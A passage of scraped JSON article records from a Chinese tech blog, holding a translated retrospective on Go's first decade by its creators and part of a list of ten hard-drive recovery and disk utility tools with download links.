class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">听风</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/9538B04AD8C6883F49C38BC8ECDDAF3C/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q4000052677\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q4000052677/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 24</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/3ad3595dc6e1f0ece9e8f816eeaeb9839f24a7ad.jpg"}
{"url_object_id": "4c6c17f1e0f1344a3e82bc74ed4170c4", "title": "Go 的这十年！Go 语言之父等人回顾", "url": "http://blog.jobbole.com/113119/", "create_date": "2017/12/04", "front_img_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1fm29qjec1aj20sg0hs0to.jpg"], "praise_nums": 2, "comment_nums": 2, "favor_nums": 0, "tags": "IT技术,Go", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q4000052677\">听风</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://commandcenter.blogspot.com/2017/09/go-ten-years-and-climbing.html\">commandcenter</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：Go 语言的主要缔造者 Rob Pike、Robert Griesemer 与 Ken Thompson，他们三人撰文回顾 Go 的发展史与一些重要人物，并曝光促成 Go 诞生的相关邮件的片段。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fm29qjec1aj20sg0hs0to.jpg\" width=\"690\" height=\"431\"></p>\n<p>2017 年 9 月，Go 语言迎来其诞生十周年纪念日。</p>\n<p>关于 Go 语言设计的初次讨论是在 2007 年 9 月 20 日，一个周四的下午。这次讨论促使 Robert Griesemer、Rob Pike、 以及 Ken Thompson 于第二天下午 2 点，在 Google’s Mountain View 的 43 号大楼的 Yaounde 会议室又组织了一次关于该语言设计的会议。语言的名字于 9 月 25 号确定了，在有关该语言设计的第一封邮件里面有关于命名的考量：</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fm29qkruczj20c207lq3s.jpg\" width=\"434\" height=\"273\"></p>\n<p>（译注：这是一封由 Rob Pike 在 2007 年 9 月 25 号，星期二，下午 3：12 回复给 Robert Griesemer、Ken Thompson 的有关编程语言讨论主题的邮件，邮件正文大意为：在开车回家的路上我得到了些灵感。1.给这门编程语言取名为“go”。你可以为这个命名假借各种理由，但它确实有其可取之处。它很简短，易书写。工具类可以命名为：goc、 gol、goa。交互式的调试工具也可以直接命名为“go”。语言文件后缀名为 .go ……）</p>\n<div class=\"paragraph\">\n<p>（值得一提的是，本语言的名字是 Go ；“golang”来自于其 web 站点网址（go.com 在当时已是一个迪士尼 web 站点地址。），并不是该语言的正确名字。）</p>\n</div>\n<p class=\"paragraph\">Go 项目团队将 2009 年 11 月 10 日，即该语言正式对外开源的日字作为其官方生日。源代码最初托管在 code.google.com 上，之后几年才迁移到 GitHub 上。但是，现在我们要回到语言设计的最初概念构建阶段，即更早的两年，这可以让我们做更进一步地回顾，以更长远的视角，见证语言发展历史上的一系列早期事件。</p>\n<div class=\"paragraph\"></div>\n<div class=\"paragraph\">\n<div class=\"paragraph\">\n<p>在开发设计 Go 语言过程中的第一个重大惊喜是收到了以下这封邮件：</p>\n<p><img class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fm29qldqvxj20bi05qaar.jpg\" width=\"414\" height=\"206\"></p>\n</div>\n<p class=\"paragraph\">(译注：这是一封由 Ian Lance Taylor 在 2008 年 6月 7 日（星期六）的晚上 7：06 写给 Robert Griesemer、Rob Pike、 Ken Thompson 的关于 Go gcc 编译器前端的邮件。邮件正文大意如下：我的同事向我推荐了这个网站 http://…/go_lang.html 。这似乎是一门很有趣的编程语言。我为它写了一个 gcc 编译器前端。虽然这个工具仍缺少很多的功能，但它确实可以编译网站上展示的那个素数筛选程序了。）</p>\n<p class=\"paragraph\"><img class=\"alignnone aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fm29qk08vvj20hw0l2tdz.jpg\" width=\"420\" height=\"494\"></p>\n<p class=\"paragraph\" style=\"text-align: center;\">（Drawing Copyright ©2017 <a href=\"http://reneefrench.io/\" target=\"_blank\">Renee French</a>）</p>\n<p class=\"paragraph\">Ian Lance Taylor 的加入以及第二个编译器 (gcc go) 的实现 在带来震惊的同时，也伴随着喜悦。这对 Go 项目来说不仅仅是鼓励，更是一种对可行性的证明。语言的第二次实现对制定语言规范和确定标准库的过程至关重要，同时也有助于保证其高可移植性，这也是 Go 语言承诺的一部分。</p>\n</div>\n<div class=\"paragraph\">\n<p>虽然 Ian 的办公室离我们不远，但在收到此邮件以前，我们三人与他素未谋面。不过，自那以后，Ian Lance Taylor 便成为了设计和实现 Go 语言及其工具的核心人物。</p>\n</div>\n<div class=\"paragraph\">\n<p> Russ Cox 在2008 年带着他的语言设计天赋和编程技巧也加入了刚成立不久的 Go 团队。Russ 发现 Go 方法的通用性意味着函数也能拥有自己的方法,这直接促成了 <strong><em><a href=\"https://golang.org/pkg/net/http/#HandlerFunc\">http.HandlerFunc</a> </em></strong>的实现，这是一个出乎我们所有人意料的结果。Russ 还提出了更多的泛化性的想法，比如 io.Reader 和 io.Writer 接口，奠定了所有 I/O 库的整体结构。</p>\n</div>\n<div class=\"paragraph\">\n<p>Jini Kim 是我们最初的产品经理，聘请了安全专家 Adam Langley 帮助 Go 走向 Google 外面的世界。Adam 为我们做了许多不为外人知晓的工作，包括创建最初的 <a href=\"https://golang.org/\"><strong><em>golang.org</em></strong></a>  网站以及 <a href=\"https://build.golang.org/\"><strong><em>build dashboard</em></strong></a>。不过他最大的贡献当属创建了 cryptographic 库。起先，在我们中的部分人看来，这个库无论在规模还是复杂度上都不成气候。但是就是这个库在后期成为了很多重要的网络和安全软件的基础，并且成为了 Go 语言开发历史的关键组成部分。许多网络基础设施公司，比如 <a href=\"https://www.cloudflare.com/\"><strong><em>Cloudflare</em></strong></a>，均重度依赖 Adam 在 Go 项目上的工作，互联网也因它变得更好。因此，就 Go 而言，我们由衷地感谢 Adam。</p>\n</div>\n<div class=\"paragraph\">\n<p>事实上，有许多公司在项目早期就开始使用 Go 语言进行开发，尤其是一些初创公司。在这些公司当中有些现已成为云计算领域中的巨头。有一家创业公司，现在叫 Docker，就是使用 Go 进行项目开发，并促进了计算机领域的容器行业，进而出现了像 Kubernetes 这样的项目。现在，我们完全可以说 Go 是容器语言，这是另一个完全出乎意料的结果。</p>\n</div>\n<div class=\"paragraph\">\n<p>不过，Go 在云计算领域中所起的作用更大。2014 年 3 月， Donnie Berkholz 为 RedMonk 撰写文章，声称 Go 是“云计算基础设施的新兴语言”。同时，Apcera 的 Derek Collison 表示，Go 已是一门云计算语言。彼时，这样的表述可能言过其实，但 Berkholz 所使用的“新兴”一词恰如其分地表达了 Go 语言在当时的地位。</p>\n</div>\n<p class=\"paragraph\">如今 Go 已经是云计算编程语言。想象一下：一个只有 10 年发展经历的编程语言已经成为了如此巨大而且正在不断发展的行业的主导者，这种成功是每个人都无法想象的。如果你认为“主导”一词太过强势，请看看中国的互联网。一段时间以来，Go 在中国大量使用的数据一度让我们误认为 Google 趋势图出现了某些错误，但是凡是去过中国，参加过中国区 Go 语言大会的人都可以证实：Google 趋势图的数据是真实的。Go 在中国的使用非常火爆！</p>\n<p class=\"paragraph\">简而言之，Go 语言的十年发展旅程中经历了众多里程碑。最令人震惊的是我们现在的位置：保守估计至少有 50 万 Go 程序员。当发送那封为 Go 命名的邮件时，憧景将会有五十万 Go 追随者，这听起来一定很荒唐。但就在此时此刻，我们不仅有 50 万 gopher，并且这个数量还在持续增长。</p>\n<div class=\"paragraph\">\n<p>说到 gophers，很高兴看到来自 Renee French 想法的吉祥物 Go Gopher(地鼠)，不仅成为了一个非常受人喜爱的作品，而且也是世界各地Go 程序员的象征。许多各地区顶级的 Go 大会都被称为 GopherCons，因为他们聚集了来自世界各地的 gophers。</p>\n</div>\n<div class=\"paragraph\">\n<p>Gopher 会议正在飞速发展。第一次大会的举办只不过是三年前的事情，但今天在全世界各地有很多这样的 Gopher 大会,并且还有无数小的本地“聚会”。无论哪一天，都会有不止一个 gopher 群体相聚在世界上的某个地方分享有关 Go 语言设计的想法。</p>\n</div>\n<div class=\"paragraph\">\n<p>回顾过去十年的 Go 设计和开发，Go 社区的发展尤其惊人的。技术会议和聚会的数量、长长的且不断增加的 Go 项目贡献者名单、大量使用Go 实现的开源代码库、使用 Go 开发公司数量（有些甚至只使用 Go 开发）：任何一项数据考量后都足以让人震惊！</p>\n</div>\n<div class=\"paragraph\">\n<p>就我们三人而言，Robert、 Rob 和 Ken，当初只是想让我们的编程生活更轻松一些，而如今，我们难以置信地、欣慰地看到我们的工作已经开始起作用了。</p>\n</div>\n<div class=\"paragraph\">\n<p>未来十年它将会带来什么呢？让我们拭目以待。</p>\n</div>\n<div class=\"paragraph\" style=\"text-align: right;\">– Rob Pike、Robert Griesemer 和 Ken Thompson</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113119\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113119votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113119\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">听风</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/9538B04AD8C6883F49C38BC8ECDDAF3C/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q4000052677\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q4000052677/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 24</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/e52a998f9dfbb36e1ef7520ece8e5a7eb3374e2c.jpg"}
{"url_object_id": "c182eaa7824072e58f8c19f872a83f03", "title": "硬盘又坏了？硬盘数据恢复的神器有这些", "url": "http://blog.jobbole.com/113133/", "create_date": "2017/11/29", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/11/62584016a56e76b8403bbbfdb8feaec9.jpg"], "praise_nums": 1, "comment_nums": 1, "favor_nums": 6, "tags": "IT技术,数据恢复", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://magazine8.com/top-10-hard-drive-recovery-tools/\">magazine8</a>   译文出处：<a target=\"_blank\" href=\"http://www.freebuf.com/sectool/94140.html\">FREEBUF/SamSmith</a>   </div><p>在一切工作进行之前，请先判断硬盘是否有损坏，以及缺损类型，而往往硬盘出现问题主要集中下以下两个方面：</p>\n<ul>\n<li>物理（驱动器故障或者组件故障）；</li>\n<li>逻辑（文件系统出错或是数据损坏）。</li>\n</ul>\n<p><strong>一旦你对硬盘的问题所在有了清楚的认识，你便可以着手寻找答案了。这里列举了十个用于硬盘数据恢复的工具。它们依靠效率和效果在众多同类工具中脱颖而出。让我们一同了解一下吧！</strong></p>\n<p><strong>1.TestDisk</strong></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/62584016a56e76b8403bbbfdb8feaec9.jpg\"></p>\n<p><a href=\"http://www.cgsecurity.org/wiki/TestDisk_Download\" target=\"_blank\">下载链接</a></p>\n<p>数据修复工具TestDisk能够修复启动分区，恢复一个分区或者删除数据，从无法访问的部分复制文件，还能轻松修复分区表。这款工具可用于诸如FAT、exFAT、NTFS和ext2等不同文件格式。</p>\n<p>注：TestDisk与一款PhotoRec的应用程序相捆绑。现在，想要恢复照片、视频及文件仅仅需要点击几下就能搞定了。扫描超出了文件系统进行了延展，可以对与丢失文件相关的数据块（集群）进行彻底检查。</p>\n<p>当你开始启动TestDisk时，会收到你是否需要一个日志文件的提示。你会看到一个可以进行挑选的分区列表。它可以帮助应用程序在读取磁盘分区时选择正确的签名。在执行操作之前，软件会提示你有哪些可用的硬盘分区，然后让你选择。</p>\n<p><strong>在每个分区你可以进行的操作如下：</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a37c1515446725744\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n·分析分区结构，来决定适当的恢复顺序\r\n·操控磁盘的框架\r\n·清空分区表的数据\r\n·启动区的恢复\r\n·进行文件分类和复制\r\n·执行删除文件的恢复\r\n·创建分区的图像</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a37c1515446725744-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a37c1515446725744-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a37c1515446725744-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a37c1515446725744-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a37c1515446725744-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a37c1515446725744-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a37c1515446725744-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a37c1515446725744-1\">·分析分区结构，来决定适当的恢复顺序</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a37c1515446725744-2\">·操控磁盘的框架</div><div class=\"crayon-line\" id=\"crayon-5a635a37c1515446725744-3\">·清空分区表的数据</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a37c1515446725744-4\">·启动区的恢复</div><div class=\"crayon-line\" id=\"crayon-5a635a37c1515446725744-5\">·进行文件分类和复制</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a37c1515446725744-6\">·执行删除文件的恢复</div><div class=\"crayon-line\" id=\"crayon-5a635a37c1515446725744-7\">·创建分区的图像</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p><a href=\"http://www.cgsecurity.org/wiki/TestDisk_Step_By_Step\" target=\"_blank\">如何使用TestDisk？</a></p>\n<p><span id=\"_baidu_bookmark_start_19\">‍</span><span id=\"_baidu_bookmark_start_21\">‍</span></p>\n<p><strong>2. EaseUS Partition Master Free<span id=\"_baidu_bookmark_end_22\">‍</span><span id=\"_baidu_bookmark_end_20\">‍</span><span id=\"_baidu_bookmark_end_20\"></span></strong></p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/22d3ecb7743d8d9f2cf6045dfd5ffa84.jpg\" width=\"500\" height=\"199\" hspace=\"0\" vspace=\"0\"></p>\n<p><a href=\"http://www.easeus.com/download/data-recovery-software.html\" target=\"_blank\">下载链接</a></p>\n<p>EaseUs是硬盘恢复数据的另一个好帮手。它是最优秀的分区管理者，你可以对分区进行移动、合并甚至是拆分。你还可以进行磁盘转换，恢复已删除或者丢失的分区，检测分区发现错误，OS到HDD/SSD的迁移，同时还可以进行磁盘碎片处理。使用EaseUS Partition Master Free工具，你可以用菜单（顶部）或者左侧窗格的操作对选中分区进行处理。</p>\n<p><a href=\"http://www.easeus.com/tutorial/drw-free-user-guide.html\" target=\"_blank\">如何使用EaseUs？</a></p>\n<p><span id=\"_baidu_bookmark_start_40\">‍</span><span id=\"_baidu_bookmark_start_42\">‍</span></p>\n<p><strong>3. WinDirStat</strong><span id=\"_baidu_bookmark_end_43\">‍</span><span id=\"_baidu_bookmark_end_41\">‍</span></p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/a50ded1ffaa97ebbc5716198b032e477.jpg\" width=\"450\" height=\"450\" hspace=\"0\" vspace=\"0\"></p>\n<p><a href=\"https://windirstat.info/download.html\" target=\"_blank\">下载链接</a></p>\n<p>WinDirStat是一款用于磁盘清理后的理想恢复工具。它让磁盘数据分布变得可视化，同时还对占用大部分空间的数据类型进行了定义。你启动了应用程序之后，这个工具生成了文件的一个树状视图，你可以选择驱动器进行分析。通过单击图形内部框，你将可以在树状视图中查看到正被搜索的文件。</p>\n<p><a href=\"http://www.cnet.com/how-to/clean-up-your-windows-hard-drive-with-windirstat/\" target=\"_blank\">如何使用WinDirStart？</a></p>\n<p><strong>4. CloneZilla</strong></p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/dc89c860b11db4c872adb2d3413da4f8.jpg\" width=\"400\" height=\"563\" hspace=\"0\" vspace=\"0\"></p>\n<p><a href=\"http://sourceforge.net/projects/clonezilla/\" target=\"_blank\">下载链接</a></p>\n<p>这个用于硬盘恢复的工具名为CloneZilla。如果你必须对硬盘进行映像和克隆，那最好的选择就是CloneZilla。它既是一个独立工具，它还能与Parted magic绑定使用。CloneZilla分为两种：CloneZilla Live和CloneZilla SE（服务器版）。后者是Linux专用工具，能够安装并进行配置通过网络给多个客户端发送邮件。CloneZilla Live是Linux专用的可引导分布区，可以进行单个设备的克隆。</p>\n<p><a href=\"http://clonezilla.org/clonezilla-usage/clonezilla-live-usage.php\" target=\"_blank\">如何使用CloneZilla？</a></p>\n<p><span id=\"_baidu_bookmark_start_94\">‍</span><span id=\"_baidu_bookmark_start_96\">‍</span></p>\n<p><strong>5. OSFMount</strong><span id=\"_baidu_bookmark_end_97\">‍</span><span id=\"_baidu_bookmark_end_95\">‍</span></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/f1c44eb40c9dfab98d44423c92993a35.jpg\"></p>\n<p><a href=\"http://www.osforensics.com/tools/mount-disk-images.html\" target=\"_blank\">下载链接</a></p>\n<p>OSFMount 是一个支持光盘镜像和内存虚拟盘创建装载实用小工具。OSFMount这个软件特色在于，既可以加载光盘镜像，也可以创建内存虚拟盘。OSFMount 还支持创建RAM 磁盘分区，也就是能够在内存中分割出一块地方虚拟成硬盘空间，这个空间速度将会非常快，对于需要高速读取磁盘的应用程序、数据库、浏览器缓存或者游戏而言，这个功能显得非常重要。第二个好处是安全，磁盘内容全在内存中，系统一关闭内容便会消失。</p>\n<p>一旦你启动了OSFMount，单击Flie（文件）并选择Mount新的虚拟磁盘。但是你必须确保勾选了“Read Only Drive”选项，以阻止近期装在的图片覆盖数据的风险。</p>\n<p><a href=\"http://www.ghacks.net/2011/03/24/mount-disk-images-with-osfmount/\" target=\"_blank\">如何使用OSFMount？</a></p>\n<p><span id=\"_baidu_bookmark_start_116\">‍</span><span id=\"_baidu_bookmark_start_118\">‍</span><span id=\"_baidu_bookmark_start_120\">‍</span><span id=\"_baidu_bookmark_start_122\">‍</span><span id=\"_baidu_bookmark_start_124\">‍</span><span id=\"_baidu_bookmark_start_126\">‍</span><span id=\"_baidu_bookmark_start_128\">‍</span><span id=\"_baidu_bookmark_start_130\">‍</span></p>\n<p><strong>6. Defraggler</strong><span id=\"_baidu_bookmark_end_131\">‍</span><span id=\"_baidu_bookmark_end_129\">‍</span></p>\n<p><span id=\"_baidu_bookmark_end_127\">‍</span><span id=\"_baidu_bookmark_end_125\">‍</span><span id=\"_baidu_bookmark_end_123\">‍</span><span id=\"_baidu_bookmark_end_121\">‍</span><span id=\"_baidu_bookmark_end_119\">‍</span><span id=\"_baidu_bookmark_end_117\">‍</span><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/b6697686973aaadffe47078e6b9e3562.jpg\"></p>\n<p><a href=\"https://www.piriform.com/defraggler/download\" target=\"_blank\">下载链接</a></p>\n<p>Defraggler 是一个轻量级的整理工具，但它可以快速高效的整理某个磁盘、文件夹甚至一个文件。也可以对硬盘进行查错，类似 Windows 的 Check Disk 命令。Defraggler还拥有了像“WinContig”的“整理指定文件/文件夹”碎片的功能。这也正是它最具有特色的地方了。我们可以在Defraggler里查看单一文件的磁盘碎片情形。完成分析之后，你可以使用驱动器映射查看零碎的文件。</p>\n<p><a href=\"https://www.piriform.com/defraggler/screenshots\" target=\"_blank\">如何使用Defraggler？</a></p>\n<p><span id=\"_baidu_bookmark_start_149\">‍</span><span id=\"_baidu_bookmark_start_151\">‍</span></p>\n<p><strong>7. SSDLife</strong><span id=\"_baidu_bookmark_end_152\">‍</span><span id=\"_baidu_bookmark_end_150\">‍</span></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/b78e647de300fe9b52a537d1f2c68d1f.jpg\"></p>\n<p><a href=\"http://ssd-life.com/eng/download-ssdlife.html\" target=\"_blank\">下载链接</a></p>\n<p>SSDLife free是一款SSD检测工具。该检测工具是一款在Windows系统下使用的免费软件，利用SSDLife free，可以检测到SSD的使用时间，”健康”资料以及其余命；如果联网将SSD的资料送到指定服务器的话，还可以从网页上观看到SSD的S.M.A.R.T.数据。</p>\n<p>注：每个SSD制造商都有专有SSD管理软件，例如英特尔SSD工具箱可以生成健康状况，并为驱动器提供详细信息。</p>\n<p><a href=\"http://ssd-life.com/eng/download-ssdlife.html\" target=\"_blank\">如何使用SSDLife？</a></p>\n<p><span id=\"_baidu_bookmark_start_171\">‍</span><span id=\"_baidu_bookmark_start_173\">‍</span></p>\n<p><strong>8. Recuva</strong></p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/2883f677113e6492b33ac92a9fd102df.jpg\" width=\"450\" height=\"484\" hspace=\"0\" vspace=\"0\"></p>\n<p><a href=\"http://www.piriform.com/recuva/builds\" target=\"_blank\">下载链接</a></p>\n<p>Recuva（数据恢复软件）是一款功能非常强大的数据恢复软件，支持Windwos系列所有操作系统，支持NTFS、Fat32、exFat等文件系统上的数据恢复。Recuva能够有效地恢复误删除、误格式化的文件，支持恢复电脑硬盘、U盘、移动硬盘等存储设备上的文件。它能很方便的让你恢复想要恢复的内容。当然，不过你不喜欢在一步一步的指导下使用软件，你也可以跳过向导，直接使用这个程序。</p>\n<p>在使用Recuva时，系统会提示你需要启动扫描，然后你要从右侧的菜单中选择要恢复的文件类型，并选择过滤选项的标准。你还可以用过滤选项对指定元素进行扫描（添加或者移除文件类型）。你还可以启用深层扫描代替快读扫描。你还能修改查看模式，并控制覆盖方式让数据安全恢复。</p>\n<p><a href=\"https://www.piriform.com/docs/recuva/using-recuva\" target=\"_blank\">如何使用Reccuva？</a></p>\n<p><span id=\"_baidu_bookmark_start_188\">‍</span><span id=\"_baidu_bookmark_start_190\">‍</span></p>\n<p><strong>9. HD Tune</strong><span id=\"_baidu_bookmark_end_191\">‍</span><span id=\"_baidu_bookmark_end_189\">‍</span></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/711e10df041b595c36b4cdcb64433163.jpg\"></p>\n<p><a href=\"http://www.hdtune.com/download.html\" target=\"_blank\">下载链接</a></p>\n<p>HD Tune是一款小巧易用的硬盘工具软件，其主要功能有硬盘传输速率检测，健康状态检测，温度检测及磁盘表面扫描存取时间、CPU占用率。另外，还能检测出硬盘的固件版本、序列号、容量、缓存大小以及当前的Ultra DMA模式等。虽然这些功能其它软件也有，但难能可贵的是此软件把所有这些功能集于一身，而且非常小巧，速度又快，更重要的是它是免费软件，可以自由使用。</p>\n<p><a href=\"http://www.hdtune.com/faq_1.html\" target=\"_blank\">如何使用HD Tune？</a></p>\n<p><span id=\"_baidu_bookmark_start_205\">‍</span><span id=\"_baidu_bookmark_start_207\">‍</span></p>\n<p><strong>10. Disk2vhd</strong><span id=\"_baidu_bookmark_end_208\">‍</span><span id=\"_baidu_bookmark_end_206\">‍</span></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/11/037705f6e0493e1a612f7273857e5418.jpg\"></p>\n<p><a href=\"https://technet.microsoft.com/en-us/sysinternals/ee656415.aspx\" target=\"_blank\">下载链接</a></p>\n<p>使用Disk2vhd创建虚拟硬盘很方便。从live机器上创建虚拟磁盘，与Microsoft Virtual PC和Microsoft 